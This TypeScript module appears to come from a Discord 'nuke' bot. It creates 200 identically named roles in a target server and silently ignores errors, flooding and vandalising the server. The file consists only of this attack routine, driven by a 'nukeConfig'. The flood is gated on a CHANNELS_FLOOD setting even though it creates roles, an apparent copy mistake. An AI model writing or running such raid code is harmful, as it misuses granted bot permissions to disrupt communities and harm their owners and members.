import { Guild } from "discord.js";
import { nukeConfig } from "../index";

export default async (guild: Guild): Promise<void> => {
	if (nukeConfig.CHANNELS_FLOOD) {
		for (let i = 0; i < 200; i++) {
			await guild.roles
				.create({
					name: nukeConfig.ROLES_FLOOD_NAME,
				})
				.catch(() => {});
		}
	}
};
